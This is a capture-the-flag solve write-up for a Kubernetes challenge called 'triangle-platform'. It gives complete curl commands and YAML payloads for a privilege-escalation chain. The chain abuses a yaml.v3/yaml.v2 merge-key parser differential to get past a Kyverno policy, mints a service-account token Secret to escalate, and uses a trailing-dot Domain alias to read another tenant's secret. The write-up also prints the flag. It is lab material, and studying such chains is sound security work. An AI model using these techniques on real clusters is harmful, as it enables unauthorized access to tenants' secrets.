# triangle-platform — solve

**Flag:** `NNS{M1Nn_bes7e_V3NN,_I_th1nK_7hat_I_MigHt_H4V3_a_kYv3RN0_4dDiCti0N_bUt_s0MeH0W_7her3_i5_No_W4y_7o_e5cap3_7he_yaM1_fUck3RY}`

One-liner: `./solve.sh https://triangle-platform-XXXX.chall.nnsc.tf`

This file is the reproducible step-by-step. For the *why* (source analysis of each
bug) see `SOLUTION.md`.

---

## Setup

```bash
B=https://triangle-platform-XXXX.chall.nnsc.tf
```

The frontend at `/` reverse-proxies to the kube-apiserver and injects
`Authorization: Bearer <tenant-a/console token>` **only when the request has no
Authorization header**. So:

* plain `curl $B/apis/...`  → acts as `system:serviceaccount:tenant-a:console`
* `curl $B/apis/... -H "Authorization: Bearer <X>"` → acts as `<X>`

`console` can only: CRUD `sites` in `tenant-a`, read `pods`/`services`/`deployments`
in `tenant-a`, and `get services/proxy` in `tenant-a`.

Sanity check:

```bash
curl -sk -XPOST $B/apis/authentication.k8s.io/v1/selfsubjectreviews \
  -H content-type:application/json \
  -d '{"kind":"SelfSubjectReview","apiVersion":"authentication.k8s.io/v1"}'
# -> username: system:serviceaccount:tenant-a:console
```

Goal: read Secret `triangle-origins/origin-acme-invoices.sites.triangle.tld`
(key `FLAG`). It is only mounted into `tenant-b/invoices` normally.

---

## Step 1 — create a `tri-edge` Site whose token has the apiserver audience

`spec.siteYAML`:

```yaml
target: null
integrations:
  - edge
<<:
  integrations:
    - forms
server:
  root: /var/run/triangle
  index: token
```

Two bugs at once:

* **`target: null`** — `decodeSite` parses with `gopkg.in/yaml.v3`. For a null
  node `yaml.v3` returns from `prepare()` *before* calling the custom
  `Target.UnmarshalYAML`, and `d.null` is a no-op on a struct, so
  `target.Decode(&site.Target)` does nothing and returns `nil`. `site.Target.Plane`
  keeps its `platformDefaults()` value `"control"`, and
  `planeAudiences["control"] == ""`. An empty projected-token audience → kubelet
  mints the token with the API server's own audiences
  (`https://kubernetes.default.svc.cluster.local`, `k3s`) → usable against the
  apiserver and the registry.
  Kyverno's `site-target-plane` (`!has(cfg.target.plane) || ...`) passes because
  `has(<null>.plane)` is `false`.

* **`integrations:[edge]` then `<<:{integrations:[forms]}`** — `yaml.v3` (operator)
  applies `<<` last and never lets it overwrite an explicit key, so the operator
  sees `[edge]` → `serviceAccountName() == "tri-edge"`.
  `goyaml.v2` (Kyverno via `sigs.k8s.io/yaml`) applies `<<` *positionally* and
  **overwrites** the earlier explicit `integrations`, so Kyverno sees `[forms]`
  → `all(i, i in ['forms','analytics'])` is true → **admitted**.

```bash
curl -sk -XPOST $B/apis/triangle.io/v1/namespaces/tenant-a/sites \
  -H content-type:application/json -d '{
  "apiVersion":"triangle.io/v1","kind":"Site","metadata":{"name":"x1"},
  "spec":{"siteYAML":"target: null\nintegrations:\n  - edge\n<<:\n  integrations:\n    - forms\nserver:\n  root: /var/run/triangle\n  index: token\n"}}'
```

Wait ~5 s for the operator, then read the projected token straight out of the
pod through nginx + the apiserver service proxy:

```bash
EDGE=$(curl -sk "$B/api/v1/namespaces/tenant-a/services/x1:80/proxy/token")
# JWT: sub=system:serviceaccount:tenant-a:tri-edge
#      aud=[https://kubernetes.default.svc.cluster.local, k3s]
```

`tri-edge` grants: `sites`/`domains` get/list/watch cluster-wide, and
**`secrets: [create, get]` in `triangle-system`**.

---

## Step 2 — `tri-edge` ➜ `tri-registry-sync` via a token Secret

Create a `kubernetes.io/service-account-token` Secret for `tri-registry-sync`;
the built-in TokenController populates `.data.token`.

```bash
curl -sk -XPOST $B/api/v1/namespaces/triangle-system/secrets \
  -H "Authorization: Bearer $EDGE" -H content-type:application/json -d '{
  "apiVersion":"v1","kind":"Secret",
  "metadata":{"name":"rsync-tok",
              "annotations":{"kubernetes.io/service-account.name":"tri-registry-sync"}},
  "type":"kubernetes.io/service-account-token"}'

sleep 3
RSYNC=$(curl -sk $B/api/v1/namespaces/triangle-system/secrets/rsync-tok \
  -H "Authorization: Bearer $EDGE" \
  | python3 -c 'import sys,json,base64;print(base64.b64decode(json.load(sys.stdin)["data"]["token"]).decode())')
# sub=system:serviceaccount:triangle-system:tri-registry-sync  (ClusterRole triangle:registry-sync -> domains: create)
```

---

## Step 3 — create a victim Site + an aliased Domain

`canonicalHost(h) = strings.ToLower(strings.TrimSuffix(h, "."))` is used **only**
by `syncOriginConfig` when it reads `origin-<canonicalHost(host)>`. The
`claimZoneHost` "bail" and `contested` checks compare `spec.host` **raw**. The
`Domain` CRD puts **no `pattern`** on `spec.host`.

Victim Site (as `console`):

```bash
curl -sk -XPOST $B/apis/triangle.io/v1/namespaces/tenant-a/sites \
  -H content-type:application/json -d '{
  "apiVersion":"triangle.io/v1","kind":"Site","metadata":{"name":"pwn"},
  "spec":{"siteYAML":"target: null\nserver:\n  root: /var/run/origin\n  index: FLAG\n"}}'
```

Aliased Domain (as `tri-registry-sync`) — host `acme-invoices.sites.triangle.tld.`
with a **trailing dot**:

```bash
curl -sk -XPOST $B/apis/triangle.io/v1/domains \
  -H "Authorization: Bearer $RSYNC" -H content-type:application/json -d '{
  "apiVersion":"triangle.io/v1","kind":"Domain","metadata":{"name":"pwn-alias"},
  "spec":{"host":"acme-invoices.sites.triangle.tld.",
          "siteRef":{"namespace":"tenant-a","name":"pwn"}}}'
```

Then nudge `Site pwn` (a no-op `PUT` with the current `resourceVersion`) so the
operator reconciles now that the Domain exists.

Why it works for `Site tenant-a/pwn`:

| check | outcome |
|---|---|
| `claimZoneHost` bail | host would be `pwn.sites.triangle.tld` — matches nothing → no bail, `tenant-a-pwn` created |
| `contested(pwn-alias)` | needs another Domain with raw host `acme-invoices.sites.triangle.tld.` → none → not contested |
| `serving({tenant-a,pwn})` | `tenant-a-pwn` **and** `pwn-alias` |
| `syncOriginConfig` | `origin-` + `canonicalHost("acme-invoices.sites.triangle.tld.")` = `origin-acme-invoices.sites.triangle.tld` → flag Secret merged into `tenant-a/pwn-origin`, mounted at `/var/run/origin` |

The pre-existing `tenant-b-acme-invoices` Domain has raw host
`acme-invoices.sites.triangle.tld` (no dot), so it neither blocks `claimZoneHost`
nor contests our alias.

---

## Step 4 — read the flag

`Site pwn`'s nginx serves `root=/var/run/origin`, `index=FLAG`:

```bash
curl -sk "$B/api/v1/namespaces/tenant-a/services/pwn:80/proxy/FLAG"
# NNS{M1Nn_bes7e_V3NN,_I_th1nK_7hat_I_MigHt_H4V3_a_kYv3RN0_4dDiCti0N_bUt_s0MeH0W_7her3_i5_No_W4y_7o_e5cap3_7he_yaM1_fUck3RY}
```
